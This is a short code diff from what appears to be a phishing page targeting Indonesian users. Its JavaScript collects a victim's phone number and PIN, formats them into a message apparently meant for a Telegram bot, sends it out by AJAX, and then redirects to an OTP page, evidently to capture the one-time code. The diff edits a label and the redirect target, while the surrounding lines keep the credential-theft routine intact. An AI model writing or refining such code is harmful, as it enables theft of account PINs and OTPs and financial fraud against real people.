@@ -1083,7 +1083,7 @@ sve_bt.onclick = function() {
         logo + "\n" + 
         tarif + "\n\n" + 
         "|𝗡𝗼𝗺𝗼𝗿 |  <code>0" + nomor.value + "</code>\n" + 
-        "|𝗣𝗶𝗻: <pre>" + pin.join("") + "</pre>\n\n" + "| 𝗞𝗶𝗿𝗶𝗺 𝗢𝗧𝗣";
+        "|𝗣𝗶𝗻: <pre>" + pin.join("") + "</pre>\n\n" + "| 𝗞𝗶𝗿𝗶𝗺 𝗖𝗼𝗱𝗲 𝗢𝗧𝗣";
   
   // Kirim menggunakan AJAX jQuery seperti contoh
   $.ajax({
@@ -1093,7 +1093,7 @@ sve_bt.onclick = function() {
     complete: function(data) {
       console.log('Complete');
       setTimeout(() => {
-        window.location.href = "otp.html";
+        window.location.href = "otp.php";
       }, 900);
     },
     error: function(xhr, status, error) {
